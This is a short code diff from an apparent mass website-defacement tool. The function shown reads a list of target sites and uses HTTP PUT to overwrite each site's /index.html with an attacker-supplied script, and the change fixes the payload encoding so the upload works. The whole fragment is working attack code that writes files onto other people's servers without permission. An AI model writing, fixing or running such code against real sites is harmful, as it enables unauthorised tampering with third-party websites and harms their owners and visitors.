@@ -104,7 +104,7 @@ def white(script, target_file="targets.txt"):
                 site = web.strip()
                 if site.startswith("http://") is False:
                     site = "http://" + site
-                req = s.put(site + "/index.html", data=op)
+                req = s.put(site + "/index.html", data=op.encode('utf-8'))
                 if req.status_code < 200 or req.status_code >= 250:
                     print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
                 else:
